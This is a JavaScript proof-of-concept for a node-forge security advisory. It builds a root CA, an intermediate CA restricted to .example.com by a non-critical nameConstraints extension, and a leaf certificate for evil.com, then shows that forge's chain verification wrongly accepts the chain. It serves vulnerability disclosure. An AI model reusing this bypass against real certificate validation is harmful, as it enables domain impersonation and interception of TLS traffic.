// Security Advisory PoC
//
// https://github.com/digitalbazaar/forge/security/advisories/GHSA-3cc4-3294-vgjf
//
// @bhaswanthc

const forge = require('../..');
const pki = forge.pki;

// Step 1: Create root CA
const rootKeys = pki.rsa.generateKeyPair(2048);
const rootCert = pki.createCertificate();
rootCert.publicKey = rootKeys.publicKey;
rootCert.serialNumber = '01';
rootCert.validity.notBefore = new Date();
rootCert.validity.notAfter = new Date();
rootCert.validity.notAfter.setFullYear(rootCert.validity.notAfter.getFullYear() + 10);
rootCert.setSubject([{name: 'commonName', value: 'Root CA'}]);
rootCert.setIssuer([{name: 'commonName', value: 'Root CA'}]);
rootCert.setExtensions([
  {name: 'basicConstraints', cA: true},
  {name: 'keyUsage', keyCertSign: true, cRLSign: true}
]);
rootCert.sign(rootKeys.privateKey, forge.md.sha256.create());

// Step 2: Create intermediate CA with nameConstraints (permitted: .example.com only)
const interKeys = pki.rsa.generateKeyPair(2048);
const interCert = pki.createCertificate();
interCert.publicKey = interKeys.publicKey;
interCert.serialNumber = '02';
interCert.validity.notBefore = new Date();
interCert.validity.notAfter = new Date();
interCert.validity.notAfter.setFullYear(interCert.validity.notAfter.getFullYear() + 5);
interCert.setSubject([{name: 'commonName', value: 'Constrained Intermediate CA'}]);
interCert.setIssuer([{name: 'commonName', value: 'Root CA'}]);
interCert.setExtensions([
  {name: 'basicConstraints', cA: true},
  {name: 'keyUsage', keyCertSign: true, cRLSign: true},
  {
    id: '2.5.29.30',         // nameConstraints OID
    critical: false,          // Non-critical to demonstrate the silent bypass
    value: forge.asn1.toDer(forge.asn1.create(
      forge.asn1.Class.UNIVERSAL, forge.asn1.Type.SEQUENCE, true, [
        // permittedSubtrees [0]
        forge.asn1.create(forge.asn1.Class.CONTEXT_SPECIFIC, 0, true, [
          // GeneralSubtree
          forge.asn1.create(forge.asn1.Class.UNIVERSAL, forge.asn1.Type.SEQUENCE, true, [
            // base: dNSName [2] = .example.com
            forge.asn1.create(forge.asn1.Class.CONTEXT_SPECIFIC, 2, false, '.example.com')
          ])
        ])
      ])).getBytes()
  }
]);
interCert.sign(rootKeys.privateKey, forge.md.sha256.create());

// Step 3: Create leaf cert for evil.com signed by the constrained CA
const evilKeys = pki.rsa.generateKeyPair(2048);
const evilCert = pki.createCertificate();
evilCert.publicKey = evilKeys.publicKey;
evilCert.serialNumber = '03';
evilCert.validity.notBefore = new Date();
evilCert.validity.notAfter = new Date();
evilCert.validity.notAfter.setFullYear(evilCert.validity.notAfter.getFullYear() + 1);
evilCert.setSubject([{name: 'commonName', value: 'evil.com'}]);
evilCert.setIssuer([{name: 'commonName', value: 'Constrained Intermediate CA'}]);
evilCert.sign(interKeys.privateKey, forge.md.sha256.create());

// Step 4: Verify chain (round-trip through PEM to populate hashes)
const rootParsed = pki.certificateFromPem(pki.certificateToPem(rootCert), true);
const interParsed = pki.certificateFromPem(pki.certificateToPem(interCert), true);
const evilParsed = pki.certificateFromPem(pki.certificateToPem(evilCert), true);

const caStore = pki.createCaStore([rootParsed]);
const chain = [evilParsed, interParsed];
let result;
try {
  result = pki.verifyCertificateChain(caStore, chain);
} catch(e) {
  result = 'rejected: ' + e.message;
}

console.log('evil.com cert verified:', result);
// Output: evil.com cert verified: true
// Expected: verification should FAIL because evil.com is outside permitted .example.com
